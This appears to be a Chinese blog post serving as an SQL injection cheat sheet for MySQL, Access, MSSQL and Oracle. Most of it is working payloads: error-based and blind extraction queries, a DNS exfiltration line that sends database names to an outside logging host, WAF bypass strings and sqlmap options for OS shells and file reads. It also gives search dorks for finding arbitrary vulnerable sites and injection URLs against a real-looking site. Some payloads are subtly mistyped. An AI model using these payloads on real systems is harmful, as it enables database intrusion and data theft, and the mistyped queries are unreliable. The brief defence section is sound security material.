---
title: sql注入总结
date: 2020-04-24 12:54:13
tags: [sql注入]
categories: sql注入
---

[toc]



## mysql

### mysql常用函数：

```mysql
system_user()
返回系统用户名
user()
数据库用户名
current_user()
当前用户
session_user() //链接数据库的用户名


database()
数据库
@@datadir
数据库路径
@@basedir
数据库安装路径
@@version_compile_os
操作系统信息
concat_ws(分隔符,..)
用自定义分隔符分割数据
group_concat()
用逗号分割数据 一行显示

#读写文件需要root权限 网站的绝对路径 由连接用户决定
slelect load_file(路径)
读文件
select ... into outfile(路径）
写文件

                        
mid(字符串，起始位置，长度） 从1开始 ==substr()
返回字符串的一部分
   

```

> **length(str)** ：返回字符串str的长度
>
> **substr(str, pos, len)** ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
>
> **mid(str,pos,len)** ：跟上面的一样，截取字符串
>
> **ascii(str)** ：返回字符串str的最左面字符的ASCII代码值
>
> **ord(str)** ：将字符或布尔类型转成ascll码
>
> **if(a,b,c)** ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

### 函数替换:

>`suustr = substring sub mid`
>
>`ASCII /hex bin ord`
>
>`sleep benchmark`

### 网站路径：

> * 报错显示
> * Google harking
> * 配置文件
> * 漏洞报错
>   * phpcms
> * 遗留文件
>   * phpinfo
> * 猜测 爆破

### mysql相关库

#### information_schema

> 1. ***infromation_schema.columns\***:
>    1. table_schema 数据库名
>    2. table_name 表名
>    3. column_name 列名
> 2. ***information_schema.tables\***
>    1. table_schema 数据库名
>    2. table_name 表名
> 3. information_schema.schemata
>    1. schema_name 数据库名

#### mysql.user

> 保存用户密码和host等信息

### 注释符号

> ```mysql
> # 
> /**/  /*/**/这样是等效于/**/
> -- + 用这个符号注意是--空格任意字符很多人搞混了
> ;%00
> `
> /*!*/ 内列注释为什么放在这里呢，因为它也可以当作一个空格 /*!/*!*/是等效于/*!*/的
> ```

### sql注入流程

#### sql注入点：

> 无特定目标：`inurl:.php?id=`
>
> 有特定目标：`nurl:.php?id=  site:target.com`
>
> 

==用sqlmap检测==、

> sqlmap-m filename(每行保存一个url）
>
> sqlmap --crawl (对目标网站进行爬取，然后依次测试）
>
> 

### 报错盲注

> #### 主键冲突
>
> > `union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+`
> >
> > `union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+`	
> >
> > ==rand被禁止==
> >
> > `select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)`
>
> #### xpath错误
>
> `updatexml(par1,par2,pat3)`
>
> > `and updatexml(1,concat(0×26,(version()),0×26),1);`
>
> > 参数2需要的是`xpath`格式的字符串
>
> `ExtractValue()`
>
> > `and (extractvalue(1,concat(0×26,(version()),0×26)));`
>
> #### 整形溢出 mysql>5.5.5
>
> > `exp(x)`e的x次方
> >
> > exp超过==710==就会溢出
> >
> > ==函数执行成功返回0 取反后是大整数==
> >
> > `Payload: and (EXP(~(select * from(select version())a)));`
>
> #### 数据重复
>
> > `payload：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x`



---

### 时间盲注 

==基本语法==

```mysql
if(ascii(substr(database(),1,1))>115,0,sleep(3))%23
if(left(user(),1)='a',0,sleep(3))
·if(条件,true,false)`
```

确定字段位数：`length()`

确定字段名：

> `select sleep(if(ORD(mid(table_name,1,1))==61,0,5)) from ...`



### Dnslog盲注

==原理==

> 布尔盲注或者时间盲注等会发送多次请求，触发设备的保护。用dnslog可以减少请求次数

  ```select load_file(concat('\\\\',(select database()),'.mysql.r40urp.ceye.io\\abd'))```

***load_file***只能在Windows平台

0 

## sql注入绕过



### 宽字节注入

> 大小是一个字节的是窄字节，大小是两个字节的是宽字节。
>
> 常用的宽字节：GB2312 GBK GB18030 BIG5 Shift_JIS等都是宽字节 都是两个字节

![image-20200429131407481](sql注入总结/image-20200429131407481.png)

> 自动加上的/和%df组成了汉字，而单引号得以保留

==sqlmap宽字节注入==

> 在url后面添加%df‘
>
> 使用unmagicquotes.py脚本绕过
>
> 

***宽字节防御***

> 1. 直接使用utf-8
> 2. mysql_real_escape_string函数，前提是使用`mysql_set_charset('gbk'.$con)`
> 3. 设置参数 `character_set_client=binary` 二进制形式来连接数据库

### 二次编码注入

> 在二次解码转化中夹了一次转义，但是转义未识别到字符，接着在最后一次解码中带入了未被转义字符

`%2527`--->`%27`--`'`'

### 二次注入

> 1. 插入恶意数据
> 2. 引用恶意数据
>
> 防御：
>
> 对提交数据严谨对待，对内部的数据也要严格检查

### mysql用户高权限注入

> #### 跨库注入
>
> > 需要root注入，一个网站无sql注入，但是获取到有root用户的数据库是可以跨库得到所以数据库信息

### HTTP_HEAD注入-XFF(X-Forward-For)注入

> 用户的真实IP

## waf绕过

---

> ***白盒绕过***
>
> 大小写：Or,OR,OR
>
> 等价替换：and:&& of:||

### 黑盒绕过

1. 架构层绕过waf：

> 1. 寻找源站：针对云waf
> 2. 同网段利用  绕过waf保护区域
> 3. 边界漏洞 ：ssrf等

2. 资源限制绕过

> post大于BODY

3. 协议绕过

> 尝试post和get等切换
>
> content-type:
>
> 参数污染：中间件和waf的识别差别 

4. 规则层面的绕过

> ```myslq
> union/**/select
> union/*aaaaaaaaaaaa*/select
> ```
>
> 内联注释：`/*!xxx*/`加了！会执行

> 空白符号绕过
>
> mysql空白符：`%09.%0A,%0B,%0D,%20,%0C,%A0/*Xxx*/`
>
> 正则的空白符：`%09,%0A,%0B,%0D,%20`
>
> 例如`union%250C`

### bypass

> `+，-，*，%，/，<<，>>，||，|，&，&&，也可以将and换成or，&&， ||等`
>
> ==空白符被过滤:==
>
> > `%09%0A %0B %0C %0D %A0 %20 /**/`
>
> ==盲注中过滤了`()`==
>
> > like:搭配 `_`和`%`
> >
> > regexp: 搭配正则表达式

### 相关函数绕过

> 1. strstr:对大小写敏感
>
> 2. 空格绕过：
>
>    > 使用内联注释
>    >
>    > 换行符代替空格：***Windows则换行符为%0A%0D，Linux则为%0A。****

## sqlmap进阶

`-- prefix  xxx`:闭合查询，例如`)))`,`"'`'

`-- suffix`:注释

> sqlmap连接数据库
>
> ` python .\sqlmap.py -d "mysql://root:011999@127.0.0.1:3306/test" --banner --users`
>
> `-l 日志文件`:抓包的日志文件进行sql注入
>
> `-X`:从sitemap.xml站点地图文件中读取目标探测
>
> `-m`:对多个url进行探测
>
> `-r`对请求头中的字段探测
>
> `-c`：从配置文件中探测
>
> `-f`:指纹信息
>
> `-v`：6个探测等级，3的时候可以显示payload
>
> Google批量扫描：
>
> `-g  "inurl:.php?id="`
>
> ==设置http请求方法==
>
> `--method=PUT`
>
> 设置为post提交：
>
> `--data="id=1"`
>
> 设置参数分隔符
>
> `--param-del='&'`:用&分割多个数据
>
> 
>
> ---
>
> sqlmap设置请求头：
>
> ---
>
> 
>
> `--user-agent`:设置
>
> `--random-'agent`'随机设置
>
> `--referer`
>
> ==对以上的检测需要设置`--level`=3==
>
> `--headers="user-agent:xxxx\ncookie:xxxxx"`
>
> ----
>
> sqlmap设置http协议认证：
>
> `--auth-type Basic/DIgest/NTLM`
>
> `--auth-cred "user:psw"`
>
> ---
>
> 
>
> ***设置代理***
>
> `--proxy`http(s)://ip[:port]
> `--proxy-cred`'usr:psw'
>
> `--proxy-file` 多条代理
>
> `--ignore-proxy` 忽略系统设置的代理
>
> ---
>
> 
>
> 设置tor网络
>
> `--tor`开启
>
> `--tor-port`指定端口
>
> `--tor-type`类型
>
> `--check-tor`检测可用
>
> ---
>
> 设置延迟
>
> `--delay 0.5`延迟0.5s
>
> ---
>
> 设置超时&连接次数
>
> `--timeout 30.0 `超时30s
>
> `--retries count`默认3次
>
> ---
>
> 设置随机化参数
>
> `--randomize id`id对于的值变化
>
> ---
>
> 设置日志过滤目标 
>
> `-l burp.log --scope="(www)?.+/com"`
>
> ---
>
> 设置忽略401
>
> `---ignore-401`出现401继续探测
>
> 绕过认证，直接探测
>
> ---
>
> 设置http私钥
>
> `--auth-firl`PEM格式文件
>
> ---
>
> 设置安全模式
>
> ***盲注过程中服务器销毁了会话***
>
> `--safe-url`指定url
>
> `--safe-post`post参数
>
> `--safe-req`读取http请求文件 -r
>
> `--safe-freq`多条http请求
>
> ----
>
> 设置忽略url编码
>
> 后端服务器不遵循RFC标准
>
> `--skip-urlencode`





> sqlmap性能优化
>
> ----
>
> 持久http连接：
> `---keep-alive` connection:keep-alive
>
> 加快探测速度
>
> ---
>
> 设置空连接 检索没有body响应的内容
>
> `--null-connection`
>
> ----
>
> 设置多线程
>
> `--thread`10
>
> 默认的线程数是1
>
> 
>
> 最大是10
>
> ---
>
> 设置预测输出
>
> `--predic-output`
>
> 与线程不兼容
>
> ---
>
> 开启所有的性能优化参数
>
> `-o`
>
> 
>
> 
>

> `-p`指定探测的参数
>
> `-p 'id,user-agent'`
>
> ---
>
> `--skip 'id'`
>
> 忽略参数
>
> ---
>
> 忽略非动态参数
>
> `--skip-static`
>
> ----
>
> 
>
> 
>
> 

***指定注入点***

> `?id=1*`*指定的是payload注入的位置 
>
> ---
>
> 

自定义探测参数

> 设置探测等级
>
> `--level` 1~5
>
> cookie >=2
>
> header>=3
>
> ----
>
> 设置风险参数
>
> `--risk` 2：增加了基于查询时间的sql注入
>
> 3：基于or
>
> ----
>
> 设置页面比较参数
>
> `--string`指定包含字符串 查询为true
>
> `--not-string`指定包含字符串
>
> `--regexp`正则表达式
>
> `--code`:转态码
>
> ----
>
> 设置内容比较参数
>
> `--text-only`:页面中的文本
>
> `--titles`对比标题
>
> 

设置具体sql注入技术

> `--technique`
>
> > B:布尔注入
> >
> > E:报错注入
> >
> > U:联合查询注入
> >
> > S:堆叠注入
> >
> > T:基于时间的注入
> >
> > Q:内联查询注入

设置盲注的时间

> `-time-sec 3`延时3秒 默认5秒

设置union字段数及探测的字符

> `--union-cols`1-20
>
> ---
>
> 设置指定的字符探测字段
>
> `--union-char`1
>
> 默认是NULL

#### ==常用参数==

> `-r`:加载http请求
>
> `-m`:多目标探测
>
> `--file-read`:读文件
>
> `--file-write`:写
>
> `--os-shell`:系统shell命令
>
> `--os-shell`:数据库自带shell
>
> `--random-agnet`
>
> `--headers`: 设置header参数
>
> `referer`:
>
> `-p`:指定参数
>
> `--dbms`指定数据库
>
> `-level`:5个等级
>
> `--risk`:四个等级 
>
> `--technique`:b e u s t
>
> `--is-dba`:是否为管理员

### tamper脚本编写

> `_priorty  ` 设置优先级
>
> `dependencies  `:脚本使用范围
>
> `tamper`:
>
> tamper使用需要设置`-v`大于等于3

### mysql注入防御：

> 1. 打开魔术引号开关，或者使用`addslashes`函数对字符进行转义
>
>    > 16进制编码和宽字节注入可以绕过
>    >
>    > （'）、双引号（"）、反斜线（）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符
>
> 2. 有关数据库操作中使用`mysqli_real_escape_string`进行转义
>
> 3. 关闭错误提示
>
>    > php.ini中的`display_errors=off`
>
> 4. `**htmlspecialchars()**`
>
>    > 对特殊的HTML中的标记进行HTML编码
>
> 5. 正则匹配
>
>    > preg_match
>    >
>    >  preg_match_all() 
>    >
>    > preg_replace
>
> 6. 最佳方式：预编译sql语句
>
>    > 变量![http://p6.qhimg.com/t011554d1448b3f5840.png](sql注入总结/t017c3e178b42dbea96.png)处用`?`代替
>    >
>    > 
>
> 



## Access注入

### tips

> Access注入中的联合查询 必须要有`from` 即必须要有数据库
>
> asp+Access  asp+mssql
>
> ==只能管理一个库==





### 函数

> `len()`
>
> `asc`
>
> `mid()`

### 基本语句、

> ==判断数据库==
>
> > `and exsits (select * from msysobjects)>0 access`
> >
> > ``and exsits (select * from sysobjects)>0 mssql`
>
> ==判断表 手工猜测==
>
> `and exsits (select * from xxx)`
>
> ==判断字段==
>
> `and exsits (select xxx  from xxx)`
>
> ==判断列==
>
> ` order by x`
>
> ==判断显示位置==
>
> `id =-1 and union select 1,2 3, .. from table`

### 偏移注入

> 知道表名 不知道字段名
>
> 借助数据库自连接查询使其内部结构乱序，从而偏移出我们所需要的内容

> 首先判断字段数，如何用union，`*`代替字段，逐渐往前推

> 判断字段数
>
> ![image-20200602213421651](sql注入总结/image-20200602213421651.png)
>
> 偏移公式:
> `order by 列数 - num(table)x“*所代表的个数”`
>
> 连接两个表：
>
> 18-2*4
>
> ![image-20200602213551426](sql注入总结/image-20200602213551426.png)
>
> 连接三个表：
>
> 18-3*4
>
>
> ![image-20200602213805296](sql注入总结/image-20200602213805296.png)

### Access 跨库查询

> `select xxx from [D://test//test_db].test.table`

## MSSQL

> asp+mssql  asp+mysql  asp+Access(搭配做多）
>
> 使用`T-SQL`

> 端口：1433
>
> 文件类型：
>
> > 日志文件：`.ldf`
> >
> > 数据库文件：`.mdf`
>
> `from sqli.dbo.SQLi`库.架构.表
>
> 

### 系统数据库

> `master`:对象信息 密码和用户
>
> `tempdb`:临时数据 重启丢失
>
> `model`:数据库模板
>
> `msdb`任务调度之类的

### 权限：

> 最低权限：`public`
>
> 文件管理 数据库操作 :`user-adminstrators`
>
> 系统级别 :`sa`
>
> ==服务器角色==
>
> ![image-20200603154118441](sql注入总结/image-20200603154118441.png)
>
> ***架构不代表权限***
>
> 
>
> ==数据库角色==
>
> ![image-20200603154143697](sql注入总结/image-20200603154143697.png)
>
> ​     public角色

### 注入

> ==存储过程==
>
> > 完成一组功能 一次编译 多次执行
> >
> > `xp_cmdshell`
>
> ==注释符号==
>
> > `/*`
> >
> > `--`
> >
> > `;%00`
>
> 
>
> ==空白符==
>
> > `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
> >
> > `/**/`
> >
> > 
>
> ==语法语义符号==
>
> > ```mssql
> > < > 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL语言的非终结符。
> > 
> > 
> > ::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。
> > 
> > 
> > [ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。
> > 
> > 
> > { } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。
> > 
> > 
> > () 括号是分组运算符
> > ```
>
> ==判断数据库==
>
> > `and exsits (select * from msysobjects)>0 access`
> >
> > ``and exsits (select * from sysobjects)>0 mssql`
>
> ==权限测试 服务器角色==
>
> > ==服务器角色==
> >
> > > `select  is _srvorlemember('sysadmin ')`
> >
> > 判断是否是sa
> >
> > ```mssql
> > 1 http://IP:PORT/less-1.asp?id=5' and exists(select is_srvrolemember('sysadmin'))--
> > 2 或http://IP:PORT/less-1.asp?id=5' and (select is_srvrolemember('sysadmin'))>0--
> > ```
>
> > 判断当前用户的读写权限:
> >
> > `http://IP:PORT/less-1.asp?id=5' and (select is_srvrolemember('db_owner'))>0--`
>
> ==基本信息==
>
> > `select  @@version`
> >
> > `db_name(num)`数据库名
> >
> > `user`
>
> ==登录名==
>
> `select  name ,loginname from master..syslogins,master..sysprocesses `
>
> ==数据库==
>
> > `select top 1 name from master..sysdatabases where dbid >4`
> >
> > > top 2 : `<>` 嵌套 `not in `
> >
> > `select top 1 name from master..sysdatabases where dbid >5`
> >
> > `select top 1 name from master..sysdatabases  for xml path)`
> >
> > `select db_name(1)`
>
> ==表名==
>
> > `select top 1 name from sysobjects where xtype="u")`
> >
> > > ![image-20200603104542695](sql注入总结/image-20200603104542695.png)
> >
> > `select top 1 name from sysobjects for xml path`
> >
> > 
>
> ==列名==
>
> > `select top 1 name from master..syscolumns where  id=(select id from sysobjects where name='admin')`
>
> ==判断站库分离==
>
> ![image-20200603105231347](sql注入总结/image-20200603105231347.png)
>
> ==判断xp_cmdshell==
>
> ![image-20200603105327238](sql注入总结/image-20200603105327238.png)
>
> `select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell'`



## oracke&postgresql

> 使用`PLsql`
>
> 权限体制:
>
> ![image-20200603092142550](sql注入总结/image-20200603092142550.png)
>
> 权限传递:
>
> > 系统权限传递 中如果中间人的权限被收回 则不影响下一级的权限
> >
> > 实体权限的传递中 如果中间人的权限被收回 则下一级的权限也收回
> >
> > 

### 相关表

> 

### 注入

> ==规则==
>
> 1. 必须跟上表名查询 或者用虚表`dual`
> 2. `union`拼接语句数据类型必须相同  可以一用`null`代替
> 3. 注释 `-- or /**/`
>
> ==判断列数==
>
> `id ="1" order by 4 --`
>
> ==回显位==
>
> `union  select  null ,null ,null  from dual  -- `
>
> ==version==
>
> `union  select  null  , (select  banner  from sys.v_$version where  rownum = 1),null  from  dual --	`
>
> > mysql  Limi  
> >
> > mssql  top
> >
> > oracle  rownum
>
> ==table==
>
> `union select  null , (select  table_name  from user_tables  where rownnum =1),null  from dual --`
>
> `union select  null , (select  table_name  from user_tables  where rownnum =1 and table_name <>'xxx '),null  from dual --`
>
> ==column-=
>
> `union select  null ,(select  column_name from  user_tab_columns where  table_name ='xxx ' and rownum = 1) , null  from dual  --`
>
> #### error_i

### 布尔盲注

> 函数:`substr(xx,1,1)`
>
> `decode`
>
> ![image-20200603094943411](sql注入总结/image-20200603094943411.png)
>
> ![image-20200603095002967](sql注入总结/image-20200603095002967.png)

### 时间盲注

> `DBMS_PIRE.RECEIVR_MESSAGE(任意值,延迟时间)`
>
> `select count(*) from all_objects` :消耗大量时间
>
> ![image-20200603100423910](sql注入总结/image-20200603100423910.png)
>
> 

### 外带通信

> `ceyei`
>
> ![image-20200603100722398](sql注入总结/image-20200603100722398.png)

### 提权&RCE

> ==执行java==
>
> 

## 数据库类型判断

> ASP最多的就是 Access和MSSQL
>
> 1. 错误提示
>
>    > MSSQL内置的`user`变量
>    >
>    > > `index.asp?id=1 and user>0`
>    > >
>    > > user是`nvarchar  `
>
> 2. 系统表中
>
>    > `msysobjects`是access的系统表 存放数据库中
>    >
>    > 国所有的对象 在web环境中读显示***无权限***
>    >
>    > `http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select
>    > count(*) from msysobjects)>0  `
>    >
>    > `sysobjects`是mssql的,下不可以正常读取
>    >
>    > `http://www.wenkuxiazai.com/showdetail.asp?id=49 and (select
>    > count(*) from sysobjects)>0  `
>    >
>    > access两个都不同于原本的页面

### bypass

> 1. 大小写绕过
>
>    > `id=1 UnIoN/**/SeLeCT 1,user()  `
>
> 2. 替换关键词
>
>    > ![image-20200604133909981](sql注入总结/image-20200604133909981.png)
>
> 3. 双重url编码
>
>    
>
> 4. 变化请求格式
>
> 5. http参数污染
>
>    > 提交多个id
>    >
>    > ![image-20200604134144394](sql注入总结/image-20200604134144394.png)
>
> 6. 空白字符注释符绕过
>
>    > `/**/`
>    >
>    > `/*!*/`
>    >
>    > 常见空白字符
>    >
>    > `id=1%0aunion select 1,user() from admin  `
>    >
>    > `其他形式如：%1%20、%3920、%40%20、%23%0a、%2d%2d%0a  `
>
> 7. 浮点数绕过
>
>    > `select * from users where id=8E0union select 1,2,3`
>    >
>    > `select * from users where id=8.0 select 1,2,3`
>
> 8. 括号绕过
>
>    > mysql中`()`中是子查询
>    >
>    > `?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23`
>
> 9. 引号绕过
>
>    > 16进制
>    >
>    > `select column_name  from information_schema.tables where table_name=0x7573657273`
>    >
>    > ==%2527==
>    >
>    > > %25=%----->%27=`'`
>    > >
>    > > 绕过`magic_quotes_gpc`
>
> 10. 逗号绕过
>
>     > ==对于`substr()和min()`可以用 `from to `==
>     >
>     > `select substr(database() from 1 for 1);`
>     >
>     > `select mid(database() from 1 for 1);`
>     >
>     > ==`join`==
>     >
>     > `union select 1,2 `变为
>     >
>     > `union select * from (select 1)a join (select 2)b`
>     >
>     > ==使用like 或者 ==
>     >
>     > > `select ascii(mid(user(),1,1))=80 `
>     > >
>     > > `select user() like 'r%'`
>     >
>     > ==limit==
>     >
>     > > `limit 0,1  ==  limit 1 offset 0`
>
> 11. 比较符号被过滤
>
>     > 使用`greater 或者 least`
>     >
>     > > `select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64`
>     >
>     > 使用between and
>     >
>     > > `between a and b = [a,b)`
>     >
>     > `or and xor not绕过：`
>     >
>     > > `and=&&  or=||   xor=|   not=!`
>
> 12. `=`绕过
>
>     > `　使用like 、rlike 、regexp 或者 使用< 或者 >`
>
> 13. 关键词绕过
>
>     > 大小写:
>     >
>     > `id=-1'UnIoN/**/SeLeCT`
>     >
>     > 内联注释:
>     >
>     > `id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#`
>     >
>     > 双写:
>     >
>     > `id=-1'UNIunionONSeLselectECT1,2,3–-`1
>     >
>     > 编码:
>     >
>     > url全编码或者char字符连接
>     >
>     > `Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。`
>
> 14. `\N`
>
>     > `ELECT * FROM admin WHERE username = \Nunion select 1,user() from admin  `